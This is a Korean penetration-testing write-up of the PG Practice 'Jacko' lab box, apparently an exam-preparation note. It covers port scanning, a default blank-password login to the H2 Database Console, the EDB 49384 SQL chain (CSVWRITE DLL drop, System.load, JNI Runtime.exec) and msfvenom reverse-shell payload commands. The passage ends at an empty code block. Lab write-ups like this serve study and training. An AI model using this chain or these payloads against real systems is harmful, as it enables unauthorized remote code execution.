---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/web/default-creds
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.66
ports: [80, 135, 139, 445, 8082, 9092]
services: [http, microsoft-ds, msrpc, netbios-ssn, xmlipcregsvc]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 5
---
PG Practice — Jacko · Intermediate
타겟 192.168.120.66 · OS Windows 10 (빌드 10.0.18363.836) · 난이도 Intermediate · **플래그 2개 중 1개 획득**
경로 요약 8082 H2 Database Console **1.4.199** → `sa` / 빈 비밀번호로 접속 → EDB **49384** (CSVWRITE 로 DLL 투하 → `System.load` → JNI `eval` 로 `Runtime.exec`) → certutil 로 msfvenom exe 내려받아 실행 → `C:\Program Files (x86)\H2\service` 셸 → `C:\Users\tony\Desktop\local.txt`
**권한상승은 미완이다.** `proof.txt` 를 얻지 못했고, 셸 안에서 열거를 돌린 기록도 남아 있지 않다. 그 사실과 정황을 §4·§6 에 남긴다.

작업일 2026-07-10. 당시 Kali `tun0` 은 **192.168.45.215** 였다(현재는 다른 주소다 — 아래 명령의 LHOST 를 그대로 복사하지 마라).

## 0. 이 박스에서 배우는 것

- 관리 콘솔의 "로그인 폼"이 인증이 아닐 수 있다. H2 Console 의 로그인 화면은 DB 인증창이 아니라 JDBC 접속 파라미터 입력창이다. 비밀번호 칸이 있다고 해서 그 뒤에 지켜야 할 무언가가 있는 게 아니다.
- DB 엔진의 파일 쓰기 프리미티브 + 네이티브 로드 = 코드 실행. `CSVWRITE` 로 임의 경로에 바이트를 쓰고, `CREATE ALIAS ... FOR "java.lang.System.load"` 로 그 파일을 JVM 에 로드한다. SQL 인젝션이 아니라 정상 SQL 권한을 그대로 쓴 것이다.
- 반쪽짜리 실행 프리미티브를 대화형 셸로 승격하는 절차. `Runtime.exec` 한 방으로는 셸이 안 된다 — 다운로더(`certutil`)와 페이로드 실행을 두 번의 exec 로 나눈다.
- 서비스에서 튀어나온 셸은 환경이 부실하다. 여기서는 `whoami` 조차 실행되지 않았다.
- 같은 이름으로 페이로드를 덮어쓰지 마라. 이 박스의 손실 시간 대부분이 "서빙 중인 `reverse.exe` 가 내가 생각한 그 빌드가 아니었다"에서 나왔다(§6).
- 시험 출제 가능성 — H2 자체가 나올 확률은 낮다. 전이되는 것은 "**비표준 고포트에 관리 콘솔이 떠 있으면 그게 진짜 입구다**" 와 "**DB 콘솔을 잡으면 파일 쓰기 → 코드 실행 경로를 먼저 찾는다**" 쪽이다. MSSQL `xp_cmdshell`, MySQL `INTO OUTFILE` + UDF, PostgreSQL `COPY ... PROGRAM` 이 같은 부류다.

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Fri Jul 10 15:38:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.66
Nmap scan report for 192.168.120.66
Host is up (0.087s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.98%I=7%D=7/10%Time=6A509371%P=x86_64-pc-linux-gnu%r(NU
SF:LL,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\
SF:0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i
SF:\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0
SF:l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\
SF:0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\
SF:.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n
SF:\0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0
SF:R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x
SF:20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\
SF:x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0
SF:o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\
SF:x009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0
SF:a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0
SF:S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g
SF:\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\
SF:r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.
SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\
SF:x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informi
SF:x,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=7/10%OT=80%CT=1%CU=30824%PV=Y%DS=4%DC=T%G=Y%TM=6A50942
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=FF%GCD=1%ISR=10D%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-07-10T06:41:36
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   86.69 ms 192.168.45.1
2   86.68 ms 192.168.45.254
3   87.06 ms 192.168.251.1
4   87.11 ms 192.168.120.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 10 15:41:50 2026 -- 1 IP address (1 host up) scanned in 205.28 seconds
```

`nnmap` 은 `~/.zshrc` 별칭이다 — `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. `-oN nmap.log` 가 박혀 있어서 작업 디렉터리를 안 바꾸면 이전 박스 로그를 덮어쓴다.

**이 스캔에서 실제로 읽어야 할 줄은 셋이다.**

`80/tcp ... http-title: H2 Database Engine (redirect)` — IIS 가 서비스하고 있지만 내용물은 H2 다. 즉 80 은 애플리케이션이 아니라 **H2 문서 사이트**다(§1 열거에서 확정된다).

`8082/tcp open http H2 database http console` — 진짜 입구. nmap 이 이름까지 붙여줬다.

`9092/tcp open XmlIpcRegSvc?` — 서비스 이름은 오탐이다. 진짜 정보는 그 아래 `SF-Port9092-TCP:` 블록 안에 있다. `\0R\0e\0m\0o\0t\0e\0...` 처럼 **글자마다 앞에 `\0` 이 붙는 것은 UTF-16BE** 다 — 널바이트가 뒤가 아니라 앞에 온다. `\0` 을 걷어내고 읽으면 이렇게 된다(위 nmap 블록을 손으로 디코드한 것이다 — 별도로 접속해본 것이 아니다):

> `org.h2.jdbc.JdbcSQLNonTransientConnectionException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-199]`

(엔디언을 반대로 잡으면 같은 바이트가 `刀攀洀漀琀攀` 같은 CJK 로 풀린다. `python3 -c "print(bytes.fromhex('005200650...').decode('utf-16-be'))"` 로 한 번 때려보는 편이 눈으로 세는 것보다 빠르다.)

9092 는 H2 의 TCP 서버이고, 원격 접속이 꺼져 있다. 여기로 JDBC 를 붙이려는 시도는 시작하기도 전에 끝난 셈이다 — 지문 하나가 막다른 길 하나를 지웠다. 덤으로 에러 문자열 꼬리의 `-199` 가 나중에 콘솔에서 본 **1.4.199** 와 일치한다. H2 는 예외 메시지에 `[에러코드-빌드번호]` 를 붙이는데(`[가정]` — 이 관례 자체는 이 박스에서 확인한 것이 아니고, 두 값이 맞았다는 관측만 있다), 그렇다면 **셸을 잡기도 전에 nmap 만으로 정확한 버전을 알 수 있었다.** 버전 판정 근거 2개가 확보되는 지점이다.

135/139/445 는 열려 있지만 SMB 를 열거한 기록이 산출물·히스토리 어디에도 없다. 5040(`unknown`)·7680(Delivery Optimization) 도 손대지 않았다.

### 웹 서버 식별

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ whatweb http://192.168.120.66 > whatweb.txt

┌──(kali㉿kali)-[~/PG/Jacko]
└─$ cat whatweb.txt
http://192.168.120.66 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.120.66], Microsoft-IIS[10.0], Script[text/javascript], Title[H2 Database Engine (redirect)][Title element contains newline(s)!]
```

nmap 이 준 것 이상은 없다. 40초짜리 확인이라 손해는 아니다.

### 디렉터리 열거

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ feroxbuster -u http://192.168.120.66/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.120.66/
 🚩  In-Scope Url          │ 192.168.120.66
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://192.168.120.66/help => http://192.168.120.66/help/
301      GET        2l       10w      152c http://192.168.120.66/images => http://192.168.120.66/images/
200      GET       46l      151w     1455c http://192.168.120.66/html/main.html
200      GET       44l      182w     1595c http://192.168.120.66/index.html
200      GET      379l      692w     5971c http://192.168.120.66/html/stylesheet.css
200      GET       44l      182w     1595c http://192.168.120.66/
301      GET        2l       10w      150c http://192.168.120.66/html => http://192.168.120.66/html/
403      GET       29l       92w     1233c http://192.168.120.66/text/
403      GET       29l       92w     1233c http://192.168.120.66/html/
301      GET        2l       10w      157c http://192.168.120.66/html/images => http://192.168.120.66/html/images/
200      GET      195l      644w     6008c http://192.168.120.66/html/navigation.js
200      GET      708l     2458w    22700c http://192.168.120.66/html/links.html
200      GET      325l     1591w    14266c http://192.168.120.66/html/build.html
200      GET      893l     5360w    40969c http://192.168.120.66/html/performance.html
200      GET     1719l     9513w    73694c http://192.168.120.66/html/features.html
200      GET     1487l     7328w    52442c http://192.168.120.66/html/changelog.html
200      GET       76l      197w     2899c http://192.168.120.66/html/download.html
200      GET     1502l     7485w    58013c http://192.168.120.66/html/tutorial.html
200      GET     1968l    11802w    89524c http://192.168.120.66/html/advanced.html
200      GET      288l     1694w    13240c http://192.168.120.66/html/faq.html
200      GET      105l      464w     3873c http://192.168.120.66/html/quickstart.html
200      GET      178l      391w     5083c http://192.168.120.66/html/grammar.html
200      GET       99l      233w     2884c http://192.168.120.66/html/datatypes.html
200      GET      189l     1242w   105089c http://192.168.120.66/html/images/connection-mode-remote-2.png
200      GET      176l     1099w    86253c http://192.168.120.66/html/images/connection-mode-embedded-2.png
200      GET      261l     1539w   126490c http://192.168.120.66/html/images/connection-mode-mixed-2.png
200      GET      182l      749w     6831c http://192.168.120.66/html/history.html
301      GET        2l       10w      150c http://192.168.120.66/text => http://192.168.120.66/text/
200      GET       52l      199w     1366c http://192.168.120.66/html/source.html
200      GET       58l      297w    21408c http://192.168.120.66/html/images/db-64-t.png
200      GET      404l     4638w    31361c http://192.168.120.66/html/license.html
200      GET      221l     1449w   124258c http://192.168.120.66/html/images/console-2.png
200      GET      179l      395w     5151c http://192.168.120.66/html/commands.html
200      GET      532l     5166w    41042c http://192.168.120.66/html/roadmap.html
200      GET       40l      158w     1334c http://192.168.120.66/html/frame.html
200      GET      154l      581w     5535c http://192.168.120.66/html/architecture.html
200      GET      122l      367w     3719c http://192.168.120.66/html/installation.html
200      GET        1l        2w      186c http://192.168.120.66/html/images/icon_disconnect.gif
200      GET      250l      847w    54735c http://192.168.120.66/html/images/quickstart-6.png
200      GET       25l      306w    20922c http://192.168.120.66/html/images/quickstart-3.png
200      GET       12l       84w     6917c http://192.168.120.66/html/images/quickstart-2.png
200      GET      213l      682w    53950c http://192.168.120.66/html/images/quickstart-4.png
200      GET       56l      330w    25271c http://192.168.120.66/html/images/quickstart-1.png
200      GET      267l      767w    64736c http://192.168.120.66/html/images/quickstart-5.png
200      GET      324l      686w     9218c http://192.168.120.66/html/functions.html
200      GET      749l     5113w    33189c http://192.168.120.66/html/mvstore.html
200      GET       24l      148w     8398c http://192.168.120.66/html/images/h2-logo-2.png
200      GET      216l      545w     6760c http://192.168.120.66/html/cheatSheet.html
200      GET      273l      939w     8212c http://192.168.120.66/html/search.js
200      GET      252l      820w     7734c http://192.168.120.66/html/sourceError.html
200      GET       24l       78w      862c http://192.168.120.66/javadoc/index.html
200      GET       63l      340w     2578c http://192.168.120.66/html/systemtables.html
200      GET      130l      369w     5001c http://192.168.120.66/html/fragments.html
200      GET       98l      311w     5241c http://192.168.120.66/javadoc/classes.html
200      GET       38l      122w     1115c http://192.168.120.66/javadoc/overview.html
200      GET      171l      283w     2165c http://192.168.120.66/javadoc/stylesheet.css
200      GET       24l       78w      862c http://192.168.120.66/javadoc/
301      GET        2l       10w      153c http://192.168.120.66/javadoc => http://192.168.120.66/javadoc/
[###################>] - 18m  4246480/4360635 31s     found:58      errors:0
[###################>] - 18m   613254/622887  563/s   http://192.168.120.66/
[####################] - 20m  4360635/4360635 0s      found:58      errors:0
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/help/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/text/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/javadoc/
```

**58건 전부가 H2 배포판에 딸려오는 문서다.** `html/features.html`·`html/changelog.html`·`javadoc/` — 애플리케이션이 아니라 `h2/docs` 디렉터리를 IIS 로 그대로 노출한 것이다. 20분을 태워 얻은 결론은 "80번에는 아무것도 없다" 한 줄이었다.

손절 지점
`http-title` 이 이미 제품 이름을 말했고, 첫 200 응답 몇 개가 전부 그 제품의 문서 페이지면 그 포트는 거기서 접는다. 문서 사이트에는 로그인도 업로드도 파라미터도 없다. 다행히 여기서는 feroxbuster 를 걸어둔 채 다른 창에서 계속 진행했다 — 익스플로잇을 확보한 `49384.txt` 의 mtime 이 **15:50** 으로, feroxbuster 가 아직 돌고 있던 시점이다(§6).

## 2. 취약점 분석

### H2 Console 의 "로그인" 은 인증이 아니다

8082 를 열면 이 화면이 나온다.

![[Pasted image 20260710161232.png]]

칸을 보면 드라이버 클래스 / JDBC URL / 사용자명 / 비밀번호 다. 이건 애플리케이션 로그인 폼이 아니라 **JDBC 접속 문자열 조립기**다. 저장된 설정 `Generic H2 (Embedded)` 의 기본값이 `org.h2.Driver` + `jdbc:h2:~/test` + 사용자 `sa` 이고, 비밀번호는 빈 칸이다.

원본 노트는 여기서 "H2 초기 패스워드"를 검색했다.

![[Pasted image 20260710161258.png]]

그대로 연결 을 누르니 붙었다.

![[Pasted image 20260710161324.png]]

왼쪽 트리에 `jdbc:h2:~/test` 와 **H2 1.4.199 (2019-03-13)** 이 찍혔다. 이 버전 문자열이 §1 의 nmap 지문 `[90117-199]` 와 맞아떨어지는 두 번째 근거다.

빈 비밀번호가 왜 통했는가
두 가지 설명이 가능하고, **이 기록만으로는 구분되지 않는다.** ① `sa` 계정의 비밀번호가 실제로 빈 값이었다. ② `~/test` 데이터베이스가 존재하지 않아 접속 시점에 새로 생성되었고, 새 DB 의 소유자 자격증명이 입력한 값(`sa` / 빈 문자열)으로 정해졌다. H2 임베디드 모드의 알려진 동작은 ②쪽이지만 **이 박스에서 확인하지 않았다** `[가정]`.

실전에서 갈림길이 되는 건 이 구분이다. ②라면 **자격증명을 맞힐 필요가 아예 없다** — 아무 경로나 적어 새 DB 를 만들고 그 안에서 SQL 을 실행하면 된다. 콘솔이 열려 있다는 것 자체가 이미 코드 실행이다.

### EDB 49384 — CVE 가 아니라 기능의 오용

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit h2 1.4.199
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
H2 Database 1.4.199 - JNI Code Execution                            | java/local/49384.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit -m 49384
  Exploit: H2 Database 1.4.199 - JNI Code Execution
      URL: https://www.exploit-db.com/exploits/49384
     Path: /usr/share/exploitdb/exploits/java/local/49384.txt
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (64895)
Copied to: /home/kali/PG/Jacko/49384.txt
```

`Codes: N/A` 가 중요하다. **CVE 번호가 없다.** 이건 패치로 막을 버그가 아니라 "DB 관리자는 원래 이 정도는 할 수 있다"는 설계를 그대로 쓴 것이다. 그래서 버전 조건도 사실상 없다 — 조건은 *H2 콘솔에 접속할 수 있는가* 하나다.

익스플로잇 본문은 SQL 세 덩어리다. 파일은 **23행짜리 텍스트**인데 125KB 나 되는데, 그중 **15행 한 줄이 124,111자**다 — DLL 전체를 `CHAR(0x..)` 로 풀어 쓴 줄이 거기 있다. 나머지 22행을 다 합쳐도 1KB 가 안 된다.

> [!warning] `searchsploit` 이 찍어준 `(64895)` 를 줄 길이로 읽지 마라
> 위 `searchsploit -m` 출력의 `File Type: ASCII text, with very long lines (64895)` 는 `file` 이 낸 값이고, `file` 은 자기 읽기 버퍼 안에서 본 길이만 보고한다. 실제 최장 행은 `awk '{print length}' 49384.txt | sort -rn | head -1` 로 재면 **124111** 이다. 두 값이 두 배 가까이 벌어진다.

**① 네이티브 DLL 을 디스크에 쓴다**

```sql
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "',
  CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00), ... ,'"'), 'ISO-8859-1', '', '', '', '', '');
```

조각별 역할:

- `CHAR(0x4d),CHAR(0x5a),...` — `MZ` 로 시작하는 PE 바이트를 한 바이트씩 문자로 만든다. SQL 콘솔에는 바이너리를 붙여넣을 방법이 없으니 텍스트로 표현한 것이다.
- `CONCAT('SELECT NULL "', ..., '"')` — 그 바이트열을 컬럼 별칭으로 감싼 SQL 문을 문자열로 조립한다. `CSVWRITE` 는 두 번째 인자를 쿼리로 돌리고 결과를 CSV 로 내보내는데, **헤더 줄에 컬럼 이름이 들어간다.** 즉 파일에 기록되는 실체는 별칭 = DLL 바이트다. 데이터 행은 `NULL` 하나뿐이라 남는 게 없다.
- `'ISO-8859-1'` — 문자셋. 0x00–0xFF 가 바이트와 1:1 로 대응하는 인코딩이어야 한다. UTF-8 이면 0x80 이상이 2바이트로 부풀어 PE 가 깨진다.
- 뒤따르는 다섯 개의 `''` — 구분자·인용부호·이스케이프 문자·NULL 표기 같은 서식 인자를 전부 빈 문자열로 만들어 **헤더 이외의 문자가 파일에 섞이지 않게** 한다.

(위 세 줄은 익스플로잇 본문의 인자 배치와 결과에서 역산한 설명이다. H2 `CSVWRITE` 의 시그니처 원문을 따로 확인하지는 않았다.)

`C:\Windows\Temp` 를 쓰는 것은 어느 계정으로 돌든 쓰기 가능한 몇 안 되는 경로이기 때문이다.

**② JVM 에 로드한다**

```sql
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
```

`CREATE ALIAS ... FOR "<완전한 자바 메서드명>"` 은 H2 의 사용자 정의 함수 기능이다. **자바 컴파일러가 필요 없는** 형태 — 이미 클래스패스에 있는 정적 메서드를 그대로 SQL 함수로 노출한다. 익스플로잇 헤더가 굳이 이 점을 적어둔 이유가 여기 있다. H2 는 자바 소스를 인라인으로 컴파일하는 경로도 갖고 있지만 그건 **JDK 가 깔려 있어야** 하고, 타겟에 JRE 만 있으면 실패한다. JNI 경로는 그 의존성을 우회한다.

**③ 그 DLL 이 등록한 네이티브 함수로 명령을 실행한다**

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

`JNIScriptEngine.eval` 은 문자열을 자바 스크립트 엔진으로 평가한다. 그래서 인자 안에 자바 코드를 통째로 써넣을 수 있다. `useDelimiter("\\Z")` 는 `Scanner` 의 구분자를 "입력 끝"으로 바꿔 **출력 전체를 한 토큰으로** 읽어오게 하는 관용구다 — 이게 없으면 첫 공백까지만 돌아온다.

> [!warning] 이 프리미티브의 한계
> `Runtime.exec` 는 **한 번에 한 프로세스**이고, 셸이 아니다. 파이프도 리다이렉션도 `&&` 도 안 먹는다(`exec` 는 셸을 거치지 않는다). stdout 만 문자열로 돌아온다. 그래서 다음 장에서 **다운로드 → 실행**을 두 번의 `CALL` 로 쪼갠다.

## 3. Foothold

### 페이로드 준비

`~/.zsh_history` 에 남은 msfvenom 호출은 네 줄이다. 순서대로:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=135 -f exe > rev.exe
```

마지막 줄만 `-o` 대신 `> rev.exe` 를 썼다. 결과 파일은 같다 — 배너는 어차피 stderr 로 나가므로 리다이렉션에 섞이지 않는다. 유일한 차이는 `-o` 를 줬을 때만 마지막에 `Saved as: <파일>` 이 붙는다는 것이다(직접 실행해 확인).

첫 줄에서 셋째 줄까지가 같은 파일을 덮어쓰는 재생성이다. meterpreter 를 버리고 소켓만 쓰는 `shell_reverse_tcp` 로 간 것은 옳은 선택이다 — **OSCP 에서 meterpreter 는 1대 한정**이고, 이런 잡박스에 그 한 장을 태울 이유가 없다. `msfvenom` 과 `multi/handler` 자체는 전 대상 허용이다.

포트가 4444 → 8082 → 135 로 옮겨간 것은 §6 에서 다룬다.

최종적으로 통한 것은 8082 판이다. 원본 노트가 남긴 실행 원문:

```bash
